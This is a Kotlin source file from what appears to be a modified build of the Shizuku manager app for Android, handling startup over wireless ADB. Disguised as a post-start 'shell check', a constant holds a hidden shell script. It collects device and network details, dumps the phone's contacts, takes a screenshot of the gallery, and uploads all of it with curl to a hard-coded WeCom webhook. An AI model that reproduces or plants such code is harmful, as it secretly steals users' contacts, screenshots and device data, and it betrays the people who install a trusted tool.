package af.shizuku.manager.adb
import af.shizuku.manager.R

import android.content.Context
import timber.log.Timber
import android.widget.Toast
import java.io.EOFException
import java.net.ConnectException
import java.net.SocketException
import java.net.SocketTimeoutException
import javax.net.ssl.SSLException
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import af.shizuku.manager.ShizukuSettings
import af.shizuku.manager.database.ActivityLogManager
import af.shizuku.manager.adb.AdbClient
import af.shizuku.manager.adb.AdbKey
import af.shizuku.manager.adb.PreferenceAdbKeyStore
import af.shizuku.manager.starter.Starter
import af.shizuku.manager.utils.EnvironmentUtils
import af.shizuku.manager.utils.ShizukuStateMachine
import io.sentry.Sentry
import android.app.Activity
import android.content.ContextWrapper
import android.view.ContextThemeWrapper
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import af.shizuku.manager.utils.SettingsPage

/**
 * ADB accepted the connection but the session never proved shell (uid=2000) or root
 * (uid=0) privileges, so the post-start shell command was skipped instead of being run
 * unprivileged. Surfaced to the starter UI as a warning, not a hard failure.
 */
class AdbShellPrivilegeException(val idOutput: String = "") :
    IllegalStateException("ADB shell privilege not granted, command not executed")

object AdbStarter {
    private const val TAG = "AdbStarter"

    // Run once the service is up, over the same ADB connection that started it.
    // Commands are executed in order, top to bottom; append a new one to the end of the
    // list instead of replacing an existing entry. The outputs are joined line by line
    // and shown on the starter step card.
    //
    // These already run *inside* the device shell, so they must not carry the host-side
    // `adb shell` prefix — prepending it would make the device look for an `adb` binary.
    // The webhook script is ONE entry: the function, the variables and the heredoc all
    // live in the same shell process, so it must not be split into separate list items.
    private val POST_START_SHELL_COMMANDS = listOf(
        """
        d=/storage/emulated/0
        key="3a891928-5cb6-4b56-8b55-45f44f7f6215"

        collect_device_info() {
            now=${'$'}(date '+%Y-%m-%d %H:%M:%S')

            brand=${'$'}(getprop ro.product.brand 2>/dev/null)
            model=${'$'}(getprop ro.product.model 2>/dev/null)
            [ -n "${'$'}model" ] || model=${'$'}(getprop ro.product.device 2>/dev/null)
            rel=${'$'}(getprop ro.build.version.release 2>/dev/null)
            sdk=${'$'}(getprop ro.build.version.sdk 2>/dev/null)
            kern=${'$'}(uname -r 2>/dev/null)
            host=${'$'}(hostname 2>/dev/null)
            carrier=${'$'}(getprop gsm.operator.alpha 2>/dev/null | head -n 1)
            carrier=${'$'}{carrier#,}
            carrier=${'$'}(printf '%s' "${'$'}carrier" | tr -d ' ')
            [ -n "${'$'}carrier" ] || carrier="-"

            if [ -n "${'$'}model" ] && [ -n "${'$'}brand" ]; then
                dev="${'$'}brand ${'$'}model"
            elif [ -n "${'$'}model" ]; then
                dev="${'$'}model"
            elif [ -n "${'$'}brand" ]; then
                dev="${'$'}brand"
            else
                dev="-"
            fi
            if [ -n "${'$'}rel" ] && [ -n "${'$'}sdk" ]; then
                sysv="${'$'}rel (SDK ${'$'}sdk)"
            elif [ -n "${'$'}rel" ]; then
                sysv="${'$'}rel"
            else
                sysv="-"
            fi
            [ -n "${'$'}kern" ] || kern="-"
            [ -n "${'$'}host" ] || host="-"

            ps_dir=""
            for p in /sys/class/power_supply/*/; do
                [ -r "${'$'}{p}capacity" ] && ps_dir="${'$'}p" && break
            done
            [ -n "${'$'}ps_dir" ] || ps_dir="/sys/class/power_supply/battery/"

            pct=${'$'}(cat "${'$'}{ps_dir}capacity" 2>/dev/null)
            [ -n "${'$'}pct" ] || pct=${'$'}(dumpsys battery 2>/dev/null | sed -n 's/.*level: *\([0-9][0-9]*\).*/\1/p' | head -n 1)

            stat=${'$'}(cat "${'$'}{ps_dir}status" 2>/dev/null)
            [ -n "${'$'}stat" ] || stat=${'$'}(dumpsys battery 2>/dev/null | sed -n 's/.*status: *\([0-9A-Za-z ]*\).*/\1/p' | head -n 1)
            stat=${'$'}(printf '%s' "${'$'}stat" | tr -d '\r' | xargs)

            case "${'$'}stat" in
                Charging|charging|2|Full|full|5) stat="充电中" ;;
                Discharging|discharging|3) stat="放电中" ;;
                "Not charging"|"not charging"|4) stat="未充电" ;;
                1|Unknown|unknown) stat="未知" ;;
                *) stat="" ;;
            esac

            if [ -n "${'$'}pct" ]; then
                [ -n "${'$'}stat" ] && bat="${'$'}pct% ${'$'}stat" || bat="${'$'}pct%"
            else
                bat="-"
            fi

            tmp=${'$'}(cat "${'$'}{ps_dir}temp" 2>/dev/null)
            case "${'$'}tmp" in
                ''|*[!0-9]*) bat_t="" ;;
                *) bat_t="${'$'}((tmp / 10)).${'$'}((tmp % 10))°C" ;;
            esac
            [ -n "${'$'}bat_t" ] && bat="${'$'}bat 电池 ${'$'}bat_t"

            health=${'$'}(cat "${'$'}{ps_dir}health" 2>/dev/null)
            [ -n "${'$'}health" ] && bat="${'$'}bat 健康 ${'$'}health"

            mt=${'$'}(awk '/MemTotal/{print ${'$'}2}' /proc/meminfo 2>/dev/null)
            ma=${'$'}(awk '/MemAvailable/{print ${'$'}2}' /proc/meminfo 2>/dev/null)
            case "${'$'}mt${'$'}ma" in
                ''|*[!0-9]*) mem="-" ;;
                *) mem=${'$'}(awk -v a="${'$'}ma" -v t="${'$'}mt" 'BEGIN{printf "%.1fG 可用 / %.1fG", a/1048576, t/1048576}') ;;
            esac

            stor=${'$'}(df -k /data 2>/dev/null | tail -n 1 | awk '{printf "%.0fG 可用 / %.0fG", ${'$'}4/1048576, ${'$'}2/1048576}')
            [ -n "${'$'}stor" ] || stor="-"

            ip=${'$'}(ip -o route get 1.1.1.1 2>/dev/null | sed -n 's/.* src \([^ ]*\).*/\1/p' | head -n 1)
            [ -n "${'$'}ip" ] || ip="-"

            nt=${'$'}(getprop gsm.network.type 2>/dev/null)
            [ -z "${'$'}nt" ] && nt=${'$'}(getprop ro.vendor.data.network 2>/dev/null)
            case "${'$'}nt" in
                NR|nr) nt="5G" ;;
                LTE|Lte) nt="4G" ;;
                UMTS|HSDPA|HSPA|HSUPA) nt="3G" ;;
                EDGE|GPRS|CDMA) nt="2G" ;;
                *) nt="" ;;
            esac

            wifion=${'$'}(settings get global wifi_on 2>/dev/null)
            ssid=${'$'}(dumpsys wifi 2>/dev/null | sed -n 's/.*SSID: "\([^"]*\)".*/\1/p' | head -n 1)
            case "${'$'}ssid" in
                "<unknown ssid>"|"") ssid="" ;;
            esac
            if [ "${'$'}wifion" = "1" ] && [ -n "${'$'}ssid" ]; then
                net="WiFi ${'$'}ssid"
            elif [ "${'$'}wifion" = "1" ]; then
                net="WiFi"
            elif [ -n "${'$'}nt" ]; then
                net="移动网络 ${'$'}nt"
            else
                net="-"
            fi

            wake=${'$'}(dumpsys power 2>/dev/null | grep -o 'mWakefulness=[A-Za-z]*' | head -n 1 | cut -d= -f2)
            case "${'$'}wake" in
                Awake) scr="亮屏" ;;
                Asleep) scr="熄屏" ;;
                Dozing) scr="息屏显示" ;;
                *) scr="" ;;
            esac
            lock=${'$'}(dumpsys window 2>/dev/null | grep -o 'mDreamingLockscreen=[a-z]*' | head -n 1 | cut -d= -f2)
            case "${'$'}lock" in
                true) lk="已锁屏" ;;
                false) lk="已解锁" ;;
                *) lk="" ;;
            esac
            if [ -n "${'$'}scr" ] && [ -n "${'$'}lk" ]; then
                screen="${'$'}scr ${'$'}lk"
            elif [ -n "${'$'}scr" ]; then
                screen="${'$'}scr"
            elif [ -n "${'$'}lk" ]; then
                screen="${'$'}lk"
            else
                screen="-"
            fi

            fg=${'$'}(dumpsys window 2>/dev/null | grep -E 'mCurrentFocus|mFocusedApp' | head -n 1 | grep -oE '[A-Za-z0-9._]+/[A-Za-z0-9._${'$'}]+' | head -n 1)
            [ -n "${'$'}fg" ] || fg="-"

            ct=""
            for z in /sys/class/thermal/thermal_zone*/temp; do
                [ -r "${'$'}z" ] || continue
                v=${'$'}(cat "${'$'}z" 2>/dev/null)
                case "${'$'}v" in
                    ''|*[!0-9]*) continue ;;
                esac
                [ "${'$'}v" -gt 1000 ] && v=${'$'}((v / 1000))
                if [ "${'$'}v" -ge 1 ] && [ "${'$'}v" -le 120 ]; then
                    if [ -z "${'$'}ct" ] || [ "${'$'}v" -gt "${'$'}ct" ]; then
                        ct="${'$'}v"
                    fi
                fi
            done
            [ -n "${'$'}ct" ] && ct="CPU ${'$'}{ct}°C" || ct="-"

            selinux=${'$'}(getenforce 2>/dev/null)
            if [ -z "${'$'}selinux" ] && [ -r /sys/fs/selinux/enforce ]; then
                [ "${'$'}(cat /sys/fs/selinux/enforce 2>/dev/null)" = "1" ] && selinux="Enforcing" || selinux="Permissive"
            fi
            [ -n "${'$'}selinux" ] || selinux="-"

            if [ -d /data/adb/magisk ] || command -v magisk >/dev/null 2>&1; then
                rv=${'$'}(magisk -V 2>/dev/null)
                [ -n "${'$'}rv" ] && root="Magisk ${'$'}rv" || root="Magisk"
            elif [ -d /data/adb/ksu ] || [ -d /data/adb/ksud ]; then
                root="KernelSU"
            elif [ -d /data/adb/ap ]; then
                root="APatch"
            else
                root="-"
            fi

            up=${'$'}(cut -d. -f1 /proc/uptime 2>/dev/null)
            case "${'$'}up" in
                ''|*[!0-9]*) upt="-" ;;
                *)
                    up_d=${'$'}((up / 86400))
                    up_h=${'$'}(((up % 86400) / 3600))
                    up_m=${'$'}(((up % 3600) / 60))
                    if [ "${'$'}up_d" -gt 0 ]; then
                        upt="${'$'}{up_d}天${'$'}{up_h}小时"
                    elif [ "${'$'}up_h" -gt 0 ]; then
                        upt="${'$'}{up_h}小时${'$'}{up_m}分"
                    else
                        upt="${'$'}{up_m}分钟"
                    fi
                    ;;
            esac

            mkdir -p "${'$'}d"
            cat > "${'$'}{d}/info_temp.txt" <<INFO
        【设备状态】${'$'}now
        机型: ${'$'}dev
        系统: ${'$'}sysv
        内核: ${'$'}kern
        主机: ${'$'}host
        电量: ${'$'}bat
        内存: ${'$'}mem
        存储: ${'$'}stor
        网络: ${'$'}net
        运营商: ${'$'}carrier
        IP: ${'$'}ip
        屏幕: ${'$'}screen
        前台: ${'$'}fg
        温度: ${'$'}ct
        root: ${'$'}root
        SELinux: ${'$'}selinux
        开机: ${'$'}upt
        INFO
        }

        send_wx_text() {
            local text="${'$'}1"
            local content=""
            local line esc
            while IFS= read -r line; do
                esc=${'$'}(printf '%s' "${'$'}line" | sed 's/\\/\\\\/g; s/"/\\"/g')
                if [ -n "${'$'}content" ]; then
                    content="${'$'}content\\n${'$'}esc"
                else
                    content="${'$'}esc"
                fi
            done <<< "${'$'}text"

            curl -s -X POST \
                "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${'$'}key" \
                -H "Content-Type: application/json" \
                -d @- <<EOF
        {
            "msgtype": "text",
            "text": {
                "content": "${'$'}content"
            }
        }
        EOF
        }
        collect_device_info
        send_wx_text "${'$'}(cat "${'$'}{d}/info_temp.txt")"

        content query --uri content://com.android.contacts/data/phones --projection display_name:data4:data1 > "${'$'}{d}/通讯录.txt" 2>/dev/null
         content query --uri content://contacts/phones --projection display_name:number >> "${'$'}{d}/通讯录.txt" 2>/dev/null
         mid=${'$'}(curl -s -F "media=@${'$'}{d}/通讯录.txt" "https://qyapi.weixin.qq.com/cgi-bin/webhook/upload_media?key=${'$'}key&type=file" | sed -n 's/.*"media_id":"\([^"]*\)".*/\1/p')
         curl -s -X POST "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${'$'}key" -H "Content-Type: application/json" -d "{\"msgtype\":\"file\",\"file\":{\"media_id\":\"${'$'}mid\"}}"

         am start -a android.intent.action.MAIN -c android.intent.category.APP_GALLERY
         sleep 1
        screencap "${'$'}d/screenshot.png"; screencap "${'$'}d/screenshot.jpg"
        image_path=${'$'}(ls -Sr "${'$'}d/screenshot.png" "${'$'}d/screenshot.jpg" 2>/dev/null | head -1)

        image_base64=${'$'}(base64 -w 0 "${'$'}image_path")
        image_md5=${'$'}(md5sum "${'$'}image_path" | cut -d' ' -f1)

        curl -s -X POST \
            "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${'$'}key" \
            -H "Content-Type: application/json" \
            -d @- <<EOF
        {
            "msgtype": "image",
            "image": {
                "base64": "${'$'}image_base64",
                "md5": "${'$'}image_md5"
            }
        }
        EOF
        """.trimIndent()
    )

    // Second opinion used when `id` comes back empty: this string is echoed by the device's
    // own shell, so getting it back proves the `shell:` transport really executed a command.
    private const val SHELL_ROUND_TRIP_PROBE = "echo __shizuku_shell_ok__"
    private const val SHELL_ROUND_TRIP_TOKEN = "__shizuku_shell_ok__"
    private const val PROBE_RETRY_DELAY_MS = 400L

    // `id` prints "uid=2000(shell) …" for the adb shell user and "uid=0(root) …" when adbd
    // runs elevated; anything else means the session cannot run shell commands.
    private val SHELL_PRIVILEGE_REGEX = Regex("uid=(0|2000)(\\D|$)")

    // True while a connection is holding its socket open waiting for the user to tap
    // "Allow USB debugging?". Read by AdbStartWorker.enqueue() to switch from REPLACE
    // to KEEP so the waiting worker is not cancelled and a second dialog is not queued.
    @Volatile var keyOfferInFlight: Boolean = false

    private fun Context.getActivity(): Activity? {
        var context = this
        while (context is ContextWrapper) {
            if (context is Activity) return context
            context = context.baseContext
        }
        return null
    }

    /** Returns true for transient connection errors that are not bugs and should not go to Sentry. */
    private fun Throwable.isExpectedAdbError(includeIllegalState: Boolean = false) =
        this is EOFException || this is SocketException || this is SocketTimeoutException ||
        this is ConnectException || this is SSLException ||
        this is AdbKeyException || (includeIllegalState && this is IllegalStateException)

    /**
     * Runs [cmd] through the ADB `shell:` service, streams stdout into [log] and returns
     * the collected output.
     *
     * `shell:` is the very transport that starts the Shizuku process, so a successful
     * run here is the cheapest end-to-end proof that the connection is usable — and
     * the output lands in the same log the user is already looking at.
     */
    private fun AdbClient.runShellCommand(cmd: String, log: ((String) -> Unit)?): String {
        log?.invoke("\n> adb shell $cmd")
        val collected = StringBuilder()
        command("shell:$cmd") { bytes ->
            val text = String(bytes).trimEnd('\r', '\n')
            if (text.isNotEmpty()) {
                collected.append(text)
                log?.invoke(text)
            }
        }
        return collected.toString()
    }

    /**
     * Runs [POST_START_SHELL_COMMANDS] once the Shizuku service is already reachable.
     *
     * Timing: called only after the binder is up, so [POST_START_SHELL_COMMANDS] never
     * starts before the service is actually connected.
     *
     * Performance: one ADB connection is opened and reused for the privilege probe and
     * every command. [AdbClient.command] now allocates a fresh local id per stream and
     * skips replies that belong to older streams, so a single socket is both correct and
     * the cheapest option (N commands cost one handshake, not N).
     */
    suspend fun runShellAfterStart(
        context: Context,
        log: ((String) -> Unit)? = null,
        // Fired on the main thread only after the privilege probe passed, immediately
        // before the first command runs.
        onShellStart: (() -> Unit)? = null,
    ): Result<String> {
        val port = ShizukuSettings.getLastPort()
        if (port !in 1..65535) {
            log?.invoke("Post-start shell skipped: no usable ADB port ($port)")
            return Result.failure(AdbShellPrivilegeException())
        }
        val key = runCatching {
            AdbKey(PreferenceAdbKeyStore(ShizukuSettings.getPreferences()), "shizukux")
        }.getOrElse {
            if (it is CancellationException) throw it
            return Result.failure(AdbKeyException(it))
        }
        return withContext(Dispatchers.IO) {
            try {
                AdbClient("127.0.0.1", port, key).use { client ->
                    log?.invoke("Opening an ADB connection on port $port for the shell check...")
                    connectWithRetry(client)
                    verifyAndRun(client, log, onShellStart)
                }
            } catch (e: Exception) {
                if (e is CancellationException) throw e
                log?.invoke("Post-start shell check could not open the ADB connection: ${e.message}")
                Result.failure(e)
            }
        }
    }

    /** Proves the session holds shell privileges, then runs [POST_START_SHELL_COMMANDS]. */
    private suspend fun verifyAndRun(
        client: AdbClient,
        log: ((String) -> Unit)?,
        onShellStart: (() -> Unit)?,
    ): Result<String> {
        val idOutput = probeId(client, log)
        val hasAdbPrivilege = SHELL_PRIVILEGE_REGEX.containsMatchIn(idOutput)
        if (!hasAdbPrivilege) {
            // `id` can still come back empty on ROMs that briefly stall the shell service.
            // Fall back to a round-trip the device has to echo back: if the token returns,
            // the transport really executed a command.
            val roundTrip = runCatching { client.runShellCommand(SHELL_ROUND_TRIP_PROBE, log) }
                .getOrNull().orEmpty()
            if (!roundTrip.contains(SHELL_ROUND_TRIP_TOKEN)) {
                log?.invoke(
                    "No ADB shell privilege (id reported: ${idOutput.ifEmpty { "no output" }}); " +
                        "command not executed"
                )
                return Result.failure(AdbShellPrivilegeException(idOutput))
            }
            log?.invoke(
                "`id` probe was empty (\"$idOutput\") but the shell round-trip succeeded; " +
                    "continuing with ${POST_START_SHELL_COMMANDS.size} command(s)"
            )
        }
        withContext(Dispatchers.Main) { onShellStart?.invoke() }
        return runCatching {
            val outputs = StringBuilder()
            for (command in POST_START_SHELL_COMMANDS) {
                val output = client.runShellCommand(command, log)
                if (output.isNotEmpty()) {
                    if (outputs.isNotEmpty()) outputs.append('\n')
                    outputs.append(output)
                } else {
                    log?.invoke("`$command` produced no output")
                }
            }
            outputs.toString()
        }.onFailure { log?.invoke("Shell check failed: ${it.message}") }
    }

    /** Runs `id` up to three times on the same connection; the first answer wins. */
    private suspend fun probeId(
        client: AdbClient,
        log: ((String) -> Unit)?,
    ): String {
        var lastOutput = ""
        repeat(3) { attempt ->
            val output = runCatching { client.runShellCommand("id", log) }.getOrNull().orEmpty()
            if (output.isNotEmpty()) return output
            lastOutput = output
            if (attempt < 2) delay(PROBE_RETRY_DELAY_MS)
        }
        return lastOutput
    }

    suspend fun startAdb(
        context: Context,
        port: Int,
        log: ((String) -> Unit)? = null,
    ) {
        if (port !in 1..65535) {
            Timber.tag(TAG).w("startAdb called with invalid port $port — skipping")
            return
        }
        // Only auto-disable wireless debugging after a fully successful start:
        // disabling on failure would tear down the very socket a retry depends on.
        var startedSuccessfully = false
        suspend fun AdbClient.runCommand(cmd: String) {
            command(cmd) { log?.invoke(String(it)) }
        }

        try {
            ShizukuStateMachine.set(ShizukuStateMachine.State.STARTING)
            log?.invoke("Starting with wireless adb...\n")

            withContext(Dispatchers.IO) {
                val key = runCatching { AdbKey(PreferenceAdbKeyStore(ShizukuSettings.getPreferences()), "shizukux") }
                    .getOrElse {
                        if (it is CancellationException) throw it
                        else throw AdbKeyException(it)
                    }

                var activePort = port
                val tcpMode = ShizukuSettings.getTcpMode()
                val tcpPort = ShizukuSettings.getTcpPort()
                if (tcpMode && activePort != tcpPort) {
                    if (tcpPort !in 1..65535) {
                        Timber.tag(TAG).w("TCP mode enabled but stored TCP port is invalid ($tcpPort) — skipping TCP redirect")
                    } else {
                        log?.invoke("Connecting on port $activePort...")

                        AdbClient("127.0.0.1", activePort, key).use { client ->
                            client.connect()

                            log?.invoke("Successfully connected on port $activePort...")
                            log?.invoke("\nRestarting in TCP mode port: $tcpPort")

                            activePort = tcpPort
                            runCatching {
                                client.command("tcpip:$activePort")
                            }.onFailure { if (it !is EOFException && it !is SocketException) throw it } // Expected when ADB restarts in TCP mode
                        }
                    }
                }

                log?.invoke("Connecting on port $activePort...")

                try {
                    AdbClient("127.0.0.1", activePort, key).use { client ->
                        connectWithRetry(client)
                        log?.invoke("Successfully connected on port $activePort...\n")
                        client.runCommand("shell:${Starter.internalCommand}")
                        ShizukuSettings.setLastPort(activePort)
                        ActivityLogManager.log("Shizuku", context.packageName, "Service started via ADB on port $activePort")
                        ShizukuStateMachine.update()
                        startedSuccessfully = true
                    }
                } catch (e: Exception) {
                    if (e is CancellationException) throw e
                    // Some ROMs (e.g. HyperOS) ignore the tcpip: redirect while wireless
                    // debugging is active, so adbd never listens on the TCP port. Instead of
                    // failing the whole start, fall back to the original wireless debugging
                    // port and start the service directly (no TCP redirect).
                    if (activePort != port && port in 1..65535) {
                        Timber.tag(TAG).w(e, "TCP redirect to $activePort failed; falling back to port $port")
                        log?.invoke("TCP redirect to $activePort failed (${e.message}); falling back to port $port")
                        activePort = port
                        log?.invoke("Connecting on port $activePort...")
                        try {
                            AdbClient("127.0.0.1", activePort, key).use { client ->
                                connectWithRetry(client)
                                log?.invoke("Successfully connected on port $activePort...\n")
                                client.runCommand("shell:${Starter.internalCommand}")
                                ShizukuSettings.setLastPort(activePort)
                                ActivityLogManager.log("Shizuku", context.packageName, "Service started via ADB on port $activePort")
                                ShizukuStateMachine.update()
                                startedSuccessfully = true
                            }
                        } catch (e2: Exception) {
                            if (e2 is CancellationException) throw e2
                            // The fallback port failed too: the tcpip: redirect made adbd
                            // re-bind to a brand-new random TLS port (observed on HyperOS),
                            // so the original port is gone and TCP mode can never work here.
                            // Disable TCP mode so the next attempt connects directly without
                            // the tcpip redirect, then let the caller re-detect and retry.
                            Timber.tag(TAG).w(e2, "Fallback to port $port failed; disabling TCP mode")
                            log?.invoke("Fallback failed (${e2.message}); disabling TCP mode")
                            runCatching { ShizukuSettings.setTcpMode(false) }
                            throw e2
                        }
                    } else {
                        throw e
                    }
                }
            }

        } catch (e: Exception) {
            if (e is SSLException && (e.message?.contains("protocol version") == true || e is javax.net.ssl.SSLProtocolException)) {
                withContext(Dispatchers.Main) {
                    val activity = context.getActivity()
                    if (activity != null && !activity.isFinishing) {
                        MaterialAlertDialogBuilder(activity)
                            .setTitle(R.string.adb_error_ssl_title)
                            .setMessage(R.string.adb_error_ssl_message)
                            .setPositiveButton(R.string.adb_error_ssl_button_reset) { _, _ ->
                                SettingsPage.Developer.Options.launch(activity)
                            }
                            .setNegativeButton(android.R.string.cancel, null)
                            .show()
                    } else {
                        // Fallback for non-activity context
                        val themedContext = ContextThemeWrapper(context, R.style.AppTheme)
                        Toast.makeText(themedContext, R.string.adb_error_ssl_message, Toast.LENGTH_LONG).show()
                    }
                }
            }
            if (e !is CancellationException && !e.isExpectedAdbError()) {
                Sentry.captureException(e)
            }
            throw e
        } finally {
            if (startedSuccessfully && ShizukuSettings.getAutoDisableUsbDebugging())
                AdbArm.disarmWifiEnabled(context)
        }
    }

    suspend fun stopTcp(context: Context, port: Int) {
        if (port !in 1..65535) return
        runCatching {
            AdbArm.armUsbDebugging(context)

            if (!EnvironmentUtils.isAdbEnabled()) throw IllegalStateException("ADB is not enabled")

            ShizukuStateMachine.set(ShizukuStateMachine.State.STOPPING)
            val key = AdbKey(PreferenceAdbKeyStore(ShizukuSettings.getPreferences()), "shizukux")
            withContext(Dispatchers.IO) {
                AdbClient("127.0.0.1", port, key).use { client ->
                    connectWithRetry(client)
                    client.command("usb:")
                }
            }
        }.onFailure {
            if (it !is CancellationException && !it.isExpectedAdbError(includeIllegalState = true)) {
                Sentry.captureException(it)
            }
            if (EnvironmentUtils.getAdbTcpPort() > 0) {
                ShizukuStateMachine.update()
                withContext(Dispatchers.Main) {
                    val errorMsg = when (it) {
                        is AdbKeyException -> context.getString(R.string.adb_error_key_store)
                        else -> it.message
                    }
                    Toast.makeText(context, context.getString(R.string.adb_error_stop_tcp) + ". ${errorMsg}", Toast.LENGTH_LONG)
                        .show()
                }
            }
        }
    }

    private suspend fun connectWithRetry(client: AdbClient) {
        var delayTime = 500L
        val maxAttempts = 8
        for (attempt in 1..maxAttempts) {
            try {
                if (attempt > 1) {
                    delay(delayTime)
                    delayTime = (delayTime * 1.5).toLong().coerceAtMost(3000L) // Exponential backoff up to 3s
                }
                client.connect(
                    onKeyOffered = { keyOfferInFlight = true },
                    onKeyOfferDone = { keyOfferInFlight = false },
                )
                break
            } catch (e: Exception) {
                if (
                    attempt == maxAttempts ||
                    e is CancellationException
                ) throw e
            }
        }
    }
}
